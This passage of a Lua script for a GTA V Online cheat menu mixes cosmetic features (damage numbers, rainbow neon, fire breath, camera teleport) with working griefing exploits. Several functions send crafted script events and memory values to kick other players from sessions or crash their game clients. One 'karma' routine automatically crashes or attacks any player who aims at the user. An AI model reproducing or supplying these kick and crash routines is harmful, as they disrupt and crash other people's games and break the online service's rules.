        random_offset_pos = {x = pos.x + (math.random() * random_offset - random_offset * 0.5),y = pos.y + (math.random() * random_offset - random_offset * 0.5),z = pos.z}
        numbers[#numbers+1] = {
            pos = random_offset_pos,
            colour = colour,
            num = num,
            size = size,
            time = 3
        }
        if #numbers == 1 then
            draw_numbers()
        end
    end
        --all credit to Nowiry#2663 for this one
        self.draw_button_tip = function (buttons, duration, colour)
            function equals(l1, l2)
                if l1 == l2 then return true end
                local type1 = type(l1)
                local type2 = type(l2)
                if type1 ~= type2 then return false end
                if type1 ~= 'table' then return false end
                for k, v in pairs(l1) do
                    if not l2[ k ] or not equals(v, l2[ k ]) then
                        return false
                    end
                end
                return true
            end
            local timer = 0
            util.create_tick_handler(function ()
                local INSTRUCTIONAL = {}
            INSTRUCTIONAL.scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('instructional_buttons')
            INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
        
            if not equals(buttons, INSTRUCTIONAL.currentsettup) or INSTRUCTIONAL.isKeyboard ~= PAD._IS_USING_KEYBOARD(2) then
                local colour = colour or {
                    ['r'] = 0,
                    ['g'] = 0,
                    ['b'] = 0
                }
        
                while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(INSTRUCTIONAL.scaleform) do
                    util.yield()
                end
                
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'CLEAR_ALL')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'TOGGLE_MOUSE_BUTTONS')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                for i = 1, #buttons do
                    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_DATA_SLOT')
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(i) --position
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(2, buttons[i][2], true)) --control
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(buttons[i][1]) --name
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(buttons[i][3] or false) --clickable
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(buttons[i][2]) --what control will be pressed when you click the button
                    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                end
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_BACKGROUND_COLOUR')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.r)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.g)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.b)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'DRAW_INSTRUCTIONAL_BUTTONS')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
                INSTRUCTIONAL.currentsettup = buttons
                INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
            end
            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(INSTRUCTIONAL.scaleform, 255, 255, 255, 255, 0)
            if timer > duration then
                return false
            end
            timer = timer + MISC.GET_FRAME_TIME()
            return true
            end)
        end
        return self
    end

b_colour = {}
b_colour.new = function ()
    local self = {}
    self.new = function (r, g, b, a)
        return {
            r = r,
            g = g,
            b = b,
            a = a
        }
    end
    self.white =    {r = 255,g = 255,b = 255,a = 255}

    self.black =    {r = 0,g = 0,b = 0,a = 255}

    self.magenta =  {r = 255,g = 0,b = 255,a = 255}

    self.red =      {r = 255,g = 0,b = 0,a = 255}

    self.green =    {r = 0,g = 255,b = 0,a = 255}

    self.blue =     {r = 0,g = 0,b = 255,a = 255}

    self.to_rage = function (colour)
        return {
            r = math.floor(colour.r * 255),
            g = math.floor(colour.g * 255),
            b = math.floor(colour.b * 255),
            a = math.floor(colour.a * 255)
        }
    end
    self.to_stand = function (colour)
        return {
            r = colour.r / 255,
            g = colour.g / 255,
            b = colour.b / 255,
            a = colour.a / 255
        }
    end
    return self
end

colour = b_colour.new()
drawing_funcs = b_drawing_funcs.new()
damage_numbers_target_ptr = memory.alloc(4)
damage_numbers_tracked_entities = {}
damage_numbers_health_colour = colour.to_stand(colour.new(20, 180, 50, 255))
damage_numbers_armour_colour = colour.to_stand(colour.new(50, 50, 200, 255))
damage_numbers_crit_colour = colour.to_stand(colour.new(200, 200, 10, 255))
damage_numbers_vehicle_colour = colour.to_stand(colour.new(200, 100, 20, 255))
damage_numbers_bone_ptr = memory.alloc(4)
damage_numbers_text_size = 0.700000
damage_numbers_target_vehicles = damage_numbers_text_size
function damage_numbers()
   if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), damage_numbers_target_ptr) then
        local target = memory.read_int(damage_numbers_target_ptr)
        if ENTITY.IS_ENTITY_A_PED(target) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if vehicle ~= 0 and damage_numbers_target_vehicles then
                if damage_numbers_tracked_entities[vehicle] == nil then
                    damage_numbers_tracked_entities[vehicle] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(vehicle)),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[vehicle].timer = 1
                end
            end
                if damage_numbers_tracked_entities[target] == nil then
                    damage_numbers_tracked_entities[target] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target) - 100),
                        armour = PED.GET_PED_ARMOUR(target),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[target].timer = 1
                end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(target) and damage_numbers_target_vehicles then
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target)),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        end
   end
   for entity, data in pairs(damage_numbers_tracked_entities) do
        if  ENTITY.IS_ENTITY_A_PED(entity) then
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity) - 100)
            local current_armour = PED.GET_PED_ARMOUR(entity)
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    PED.GET_PED_LAST_DAMAGE_BONE(entity, damage_numbers_bone_ptr)
                    if memory.read_int(damage_numbers_bone_ptr) == 31086 then
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_crit_colour, damage_numbers_text_size)
                    else
                        drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_health_colour, damage_numbers_text_size)
                    end
                end
                if current_armour < data.armour then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.armour - current_armour, damage_numbers_armour_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
            data.armour = current_armour
        else
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity))
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.health - current_health, damage_numbers_vehicle_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
        end
    end
end
--抛掷NPC/载具
function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function get_closest_ped_new(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
    local entity_held = 0
    local are_hands_up = false
    local ped_held = 0
function throwvehs()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true)  then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                if veh ~= nil then 
                    local dist = closest[2]
                    if dist <= 5 then 
                        request_anim_dict("missminuteman_1ig_2")
                        TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                        util.yield(500)
                        are_hands_up = true
                        ENTITY.SET_ENTITY_ALPHA(veh, 100)
                        ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        request_control_of_entity_once(veh)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                        entity_held = veh
                    end 
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end
function throwpeds()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped_new(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                if closest ~= nil then
                    local ped = closest[1]
                    if ped ~= nil then
                        local dist = closest[2]
                        if dist <= 5 then 
                            request_anim_dict("missminuteman_1ig_2")
                            TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                            util.yield(500)
                            are_hands_up = true
                            ENTITY.SET_ENTITY_ALPHA(ped, 100)
                            ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                            request_control_of_entity_once(ped)
                            ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                            entity_held = ped
                        end 
                    end
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
            -- toss
        end
    end
end
--恢复模型
function restore_model()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
        menu.trigger_commands("walkstyle normal")
    else
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("walkstyle normal")
    end
end
function diaoshepao(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
function kickcar(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        DECORATOR.DECOR_REGISTER("Player_Vehicle", 3)
        DECORATOR.DECOR_SET_INT(player_veh,"Player_Vehicle", 0)
    else
        util.toast("八嘎，玩家不在车内，踢不了")
    end
end
------------------------------------
-------------玩家踢出---------------
------------------------------------
--阻止加入踢
function blockjoinkick(PlayerID)
    menu.trigger_commands("historyblock " .. players.get_name(PlayerID))
    menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv1(PlayerID)
        util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
        menu.trigger_commands("breakup" .. players.get_name(PlayerID))
end
--智能踢
function autokickv2(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << PlayerID, {0x6A16C7F, PlayerID, memory.script_global(0x2908D3 + 1 + (PlayerID * 0x1C5) + 0x13E + 0x7)})
    util.trigger_script_event(1 << PlayerID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (PlayerID * 0x257) + 0x1FE))})
end
--静默踢
function silencekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {421832664, PlayerID, 0, memory.read_int(memory.script_global(1951261 + 829))})
end
--美国国家航空航天局踢
function nasakick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, -210634234})
end
--自然死亡踢
function freemodekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {111242367, PlayerID, memory.script_global(2689235 + 1 + (PlayerID * 453) + 318 + 7)})
end
--网络保释踢
function networkkick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (PlayerID * 599) + 510))})
end
--无效掉落踢
function invalidcollectiblekick(PlayerID)
    util.trigger_script_event(1 << PlayerID, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
end
function request_weapon_asset(hash)
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do util.yield_once() end
end
---5g崩溃
function x999gcrash(PlayerID)
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()
                        
    for i = 1, #veh do
     NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
     ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
     TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
end
--6G崩溃
        function six6crash(PlayerID)
            local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
            pos.z = pos.z + 5
            veh = entities.get_all_vehicles_as_handles()
            
          for i = 1, #veh do
          NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
          ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
          end
      end
function sendscriptevent_one()
    for pid = 0, 32 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-93722397 ,1, 0, 0, 4,0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
function sendscriptevent_two()
   for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 3, 1})
        end
    end
end
function sendscriptevent_three()
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {434937615, pid, 0, 1, id})
        end
    end
end
local function transitionValue(value, target, step)
    if value == target then return value end
    return value + step * ( value > target and -1 or 1 )
end

function fireBreathSettings:changePos(movementType)
    self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
    self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
end

levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)

function firebreathxxx(toggle)
    fireBreathSettings.on = toggle
    if toggle then
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
            STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            util.yield()
        end
        GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
        fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
    else
        GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
        fireBreathSettings.ptfx = nil
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
    util.create_tick_handler(function()
        local user_ped = players.user_ped()
        if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
        elseif menu.get_value(levitationCommand) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
        else
            local movementType = 'still'
            if TASK.IS_PED_SPRINTING(user_ped) then
                movementType = 'sprint'
            elseif TASK.IS_PED_WALKING(user_ped) then
                movementType = 'walk'
            elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                movementType = 'sneak'
            end

            fireBreathSettings:changePos(movementType)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
        end
        return fireBreathSettings.on
    end)
end
function firebreathcolour(colour)
    fireBreathSettings.colour = colour
    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
end
function Specon(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' on')
    util.yield(3000)
end
function Specoff(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' off')
end
function playerIsTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end
function sendscriptcrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
util.trigger_script_event(1 << karmaPid, { -555356783, karmaPid ,85952,99999,52682274855,526822745 })
util.trigger_script_event(1 << karmaPid, { 526822748, karmaPid ,78552,99999 ,7949161,789454312})
util.trigger_script_event(1 << karmaPid, { -66669983, karmaPid ,526822748,555555, math.random(80521,2959749521) })
util.trigger_script_event(1 << karmaPid, { -1733737974, karmaPid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
util.trigger_script_event(1 << karmaPid, { -1529596656, karmaPid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
util.trigger_script_event(1 << karmaPid, { -8965204809, karmaPid ,795221,59486,48512151,-9545440 })
    end
end
function sendgobreach()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-93722397 ,1, 0, 0, 4,0,karmaPid, karmaPid})
    end
end
function sendallplayercrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        GTPlayer(karma[userPed].ped, true, expSettings)
    end
end
function bulletaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[userPed].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 0.1, 100, true, 100416529, userPed, true, false, 100.0)
        util.yield(getTotalDelay(expLoopDelay))
    end
end
function expaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        explodePlayer(karma[userPed].ped, true, expSettings)
    end
end
function godaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] and players.is_godmode(karma[userPed].pid) then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-1388926377, karmaPid, -1762807505, math.random(0, 9999)})
    end
end
local rgb = {cus = 100}
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
function rainbow_car()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        WIRI_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb.cus)
       end
    end

function set_speed_rainbowcar(c)
    rgb.cus = c
end
local srgb = {cus = 100}
function rainbow_car_light()
    local color = {
        {64, 1}, --blue
        {73, 2}, --eblue  
        {51, 3}, --mgreen
        {92, 4}, --lgreen
        {89, 5}, --yellow
        {88, 6}, --gshower
        {38, 7}, --orange
        {39 , 8}, --red
        {137, 9}, --ponypink
        {135, 10}, --hotpink
        {145, 11}, --purple
        {142, 12} --blacklight
      }
     if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
      local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
      RGBNeonKit(players.user_ped())
      local rcolor = math.random(1, 12)
      WIRI_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
      WIRI_VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
      WIRI_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
      util.yield(srgb.cus)
    end
end
function set_speed_light(c)
    srgb.cus = c
end
function Get_Waypoint_Pos2()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            return waypoint_pos
        else
            util.toast("标点啊吊毛")
        end
end
    CCAM = 0
STP_SPEED_MODIFIER = 0.02
STP_COORD_HEIGHT = 300

FRAME_STP = false

--preload
DR_TXT_SCALE = 0.5

--preload
EP_drawveh = true
EP_drawped = true
EP_drawobj = true
EP_drawpick = true
----
EPS_vehx = 0.0
EPS_vehy = 0.03
--
EPS_pedx = 0.0
EPS_pedy = 0.05
--
EPS_objx = 0.0
EPS_objy = 0.07
--
EPS_pickx = 0.0
EPS_picky = 0.09
--
FRAME_STP = false
    function SmoothTeleportToCord(v3coords, teleportFrame)
        local wppos = v3coords
        local localped = getPlayerPed(players.user())
        if wppos ~= nil then
            if not CAM.DOES_CAM_EXIST(CCAM) then
                CAM.DESTROY_ALL_CAMS(true)
                CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                CAM.SET_CAM_ACTIVE(CCAM, true)
                CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
            end
            --
            if teleportFrame then
                util.create_tick_handler(function ()
                    if CAM.DOES_CAM_EXIST(CCAM) then
                        local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then 
                            ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) 
                        else
                            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                            ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false)
                        end
                    else
                        return false
                    end
                end)
            end
            --
            local pc = getEntityCoords(getPlayerPed(players.user()))
            --
            for i = 0, 1, STP_SPEED_MODIFIER do 
                CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
                directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, WhiteText, false)
                local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
                CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
                wait()
            end
    
            local currentZ = CAM.GET_CAM_COORD(CCAM).z
            local coordDiffx = wppos.x - pc.x
            local coordDiffxy = wppos.y - pc.y
            for i = 0, 1, STP_SPEED_MODIFIER / 2 do 
                CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
                wait()
            end
           
            local success, ground_z
            repeat
                STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
